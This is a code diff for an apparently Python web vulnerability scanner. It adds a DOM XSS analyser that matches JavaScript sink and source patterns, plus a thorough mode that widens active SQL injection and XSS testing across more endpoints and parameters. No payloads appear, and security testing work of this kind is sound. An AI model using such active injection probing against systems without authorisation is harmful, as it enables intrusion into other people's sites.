+            print(f"[dom-xss] Skipping large minified file: {js_url}", file=sys.stderr)
+            continue
+
+        findings = _analyze_js_content(out, js_url)
+        results["findings"].extend(findings)
+        results["files_analyzed"] += 1
+
+    # Deduplicate findings
+    seen = set()
+    unique_findings = []
+    for f in results["findings"]:
+        key = (f["sink_type"], f["file"], f.get("line", 0))
+        if key not in seen:
+            seen.add(key)
+            unique_findings.append(f)
+
+    results["findings"] = unique_findings
+    results["potential_vulns"] = len(unique_findings)
+
+    # Count sinks and sources
+    results["sinks_found"] = sum(1 for f in results["findings"] if "sink" in f.get("type", "").lower())
+    results["sources_found"] = sum(1 for f in results["findings"] if f.get("source_nearby", False))
+
+    return results
+
+
+def _analyze_js_content(js_content: str, source_url: str) -> list[dict]:
+    """
+    Analyze JavaScript content for DOM XSS patterns.
+
+    Returns list of potential vulnerability findings.
+    """
+    findings = []
+
+    # Split into lines for line number tracking
+    lines = js_content.split("\n")
+
+    for line_num, line in enumerate(lines, 1):
+        # Check for sinks
+        for sink_pattern, severity, sink_name in DOM_XSS_SINKS:
+            if re.search(sink_pattern, line, re.I):
+                # Check if any source is nearby (within 5 lines)
+                context_start = max(0, line_num - 6)
+                context_end = min(len(lines), line_num + 5)
+                context = "\n".join(lines[context_start:context_end])
+
+                source_nearby = False
+                source_found = None
+                for source_pattern in DOM_XSS_SOURCES:
+                    if re.search(source_pattern, context, re.I):
+                        source_nearby = True
+                        source_found = source_pattern
+                        break
+
+                # Only report if source is nearby (likely taint flow)
+                if source_nearby:
+                    # Extract the vulnerable code snippet
+                    snippet = line.strip()[:200]
+
+                    findings.append({
+                        "type": "DOM_XSS",
+                        "sink_type": sink_name,
+                        "severity": severity,
+                        "file": source_url,
+                        "line": line_num,
+                        "snippet": snippet,
+                        "source_nearby": source_nearby,
+                        "source_pattern": source_found,
+                        "confidence": 0.7 if source_nearby else 0.4,
+                        "evidence": [
+                            f"Sink: {sink_name} at line {line_num}",
+                            f"Source: {source_found} found nearby",
+                            f"Code: {snippet}",
+                        ],
+                        "description": f"Potential DOM XSS: {sink_name} sink with {source_found} source",
+                    })
+
+    return findings
 
 
 async def run_smart_active_tests(
@@ -3077,7 +4135,8 @@ async def run_smart_active_tests(
     signals: dict | None = None,
     auth_session: Any | None = None,
     run_xss: bool = True,
-    run_sqli: bool = True
+    run_sqli: bool = True,
+    thorough_params: bool = False
 ) -> dict:
     """
     Run all smart active tests (SQLi + XSS).
@@ -3091,12 +4150,26 @@ async def run_smart_active_tests(
         auth_session: AuthSession for authenticated requests (optional)
         run_xss: Whether to run XSS checks
         run_sqli: Whether to run SQLi checks
+        thorough_params: If True, test 100 endpoints x 10 params instead of 50x5 (default)
 
     Returns:
         Combined results from all tests
     """
     tech_stack = tech_stack or []
     signals = signals or {}
+
+    # Thorough mode uses expanded limits
+    if thorough_params:
+        sqli_max_endpoints = 100
+        sqli_max_params = 10
+        xss_max_endpoints = 100
+        xss_max_params = 10
+        print(f"[active] Thorough mode: testing up to {sqli_max_endpoints} endpoints x {sqli_max_params} params", file=sys.stderr)
+    else:
+        sqli_max_endpoints = 50
+        sqli_max_params = 5
+        xss_max_endpoints = 50
+        xss_max_params = 5
 
     print(f"[active] Running smart active tests on {len(endpoints)} endpoints", file=sys.stderr)
     if signals:
@@ -3122,7 +4195,11 @@ async def run_smart_active_tests(
 
     # Run SQLi and XSS tests with signal awareness
     if run_sqli:
-        sqli_results = await smart_sqli_test(url, prioritized_endpoints, dbms, auth_session)
+        sqli_results = await smart_sqli_test(
+            url, prioritized_endpoints, dbms, auth_session,
+            max_endpoints=sqli_max_endpoints,
+            max_params_per_endpoint=sqli_max_params
+        )
     else:
         sqli_results = {
             "findings": [],
@@ -3136,7 +4213,11 @@ async def run_smart_active_tests(
         }
 
     if run_xss:
-        xss_results = await smart_xss_test(url, endpoints, auth_session=auth_session)
+        xss_results = await smart_xss_test(
+            url, endpoints, auth_session=auth_session,
+            max_endpoints=xss_max_endpoints,
+            max_params_per_endpoint=xss_max_params
+        )
     else:
         xss_results = {
             "findings": [],
@@ -3160,12 +4241,17 @@ async def run_smart_active_tests(
             "vulnerabilities_found": sqli_results.get("vulnerabilities_found", 0),
             "get_endpoints_tested": sqli_results.get("get_endpoints_tested", 0),
             "post_endpoints_tested": sqli_results.get("post_endpoints_tested", 0),
+            "endpoints_tested": sqli_results.get("endpoints_tested", 0),
+            "params_tested": sqli_results.get("params_tested", 0),
         },
         "xss": {
             "findings": xss_findings,
             "reflections_found": xss_results.get("reflections_found", 0),
             "vulnerabilities_found": xss_results.get("vulnerabilities_found", 0),
+            "endpoints_tested": xss_results.get("endpoints_tested", 0),
+            "params_tested": xss_results.get("params_tested", 0),
         },
         "dbms_detected": sqli_results.get("dbms_detected"),
-        "total_endpoints_tested": sqli_results.get("endpoints_tested", 0),
+        "total_endpoints_tested": sqli_results.get("endpoints_tested", 0) + xss_results.get("endpoints_tested", 0),
+        "total_params_tested": sqli_results.get("params_tested", 0) + xss_results.get("params_tested", 0),
     }
